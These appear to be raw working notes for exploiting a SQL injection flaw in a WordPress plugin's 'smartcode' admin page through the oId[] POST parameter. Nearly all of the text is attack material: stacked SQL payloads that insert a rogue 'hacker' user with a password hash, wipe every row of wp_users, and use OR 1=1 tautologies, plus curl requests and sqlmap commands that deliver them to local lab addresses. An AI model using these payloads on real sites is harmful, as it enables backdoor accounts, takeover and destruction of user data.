DELETE FROM $table_name WHERE id = ".$_POST["oId"][$i]." LIMIT 1

INSERT INTO wp_users (user_login,user_pass,user_nicename)
VALUES ("hacker","6e6bc4e49dd477ebc98ef4046c067b5f","lohacker")


funzia:
DELETE FROM wp_smartgoogleadwords WHERE id = 0;INSERT INTO wp_users (ID)
VALUES (13);SELECT * FROM wp_users LIMIT 1

DELETE FROM wp_smartgoogleadwords WHERE id = 0;DELETE FROM wp_users WHERE 1=1;SELECT * FROM wp_usermeta LIMIT 1


curl:

curl -k -i --raw -X POST -d "action=saveadwords&delconf=1&oId[]=1 OR 1=1--&ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" "http://localhost/wordpress/wp-admin/options-general.php?page=smartcode" -H "Host:localhost" -H "Content-Type: application/x-www-form-urlencoded"

curl -k -i --raw -X POST -d "action=saveadwords&delconf=1&oId[]=1 ;DELETE FROM wp_users WHERE 1=1;SELECT * FROM wp_usermeta &ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" "http://localhost/wordpress/wp-admin/options-general.php?page=smartcode" -H "Host:localhost" -H "Content-Type: application/x-www-form-urlencoded"



curl -x localhost:8080 -k -i --raw -X POST -d "action=saveadwords&delconf=1&oId[]=1 ;INSERT INTO wp_users (user_login,user_pass,user_nicename)VALUES (\"vale\",\"6e6bc4e49dd477ebc98ef4046c067b5f\",\"lavale\");SELECT * FROM wp_users &ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" "http://192.168.1.4/wordpress/wp-admin/options-general.php?page=smartcode" -H "Host:localhost" -H "Content-Type: application/x-www-form-urlencoded"

curl -x localhost:8080 -k -i --raw -X POST -d "action=saveadwords&delconf=1&oId[]=1 ;INSERT INTO wp_users (user_login,user_pass,user_nicename)VALUES (\"vale\",\"6e6bc4e49dd477ebc98ef4046c067b5f\",\"lavale\");SELECT * FROM wp_users &ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" "http://192.168.1.4/wordpress/" -H "Host:localhost" -H "Content-Type: application/x-www-form-urlencoded"


SQL MAP EXAMPLE:
sqlmap --url 192.164.1.4/wordpress --method POST --data "action=saveadwords&delconf=1&oId[]=1 ;INSERT INTO wp_users (user_login,user_pass,user_nicename)VALUES (\"vale\",\"6e6bc4e49dd477ebc98ef4046c067b5f\",\"lavale\");SELECT * FROM wp_users &ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" -p "oId"
`

python sqlmap.py --url http://localhost/wordpress/wp-admin/options-general.php?page=smartcode --method POST --data "action=saveadwords&delconf=1&oId[]=1&ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" -p " oId[]"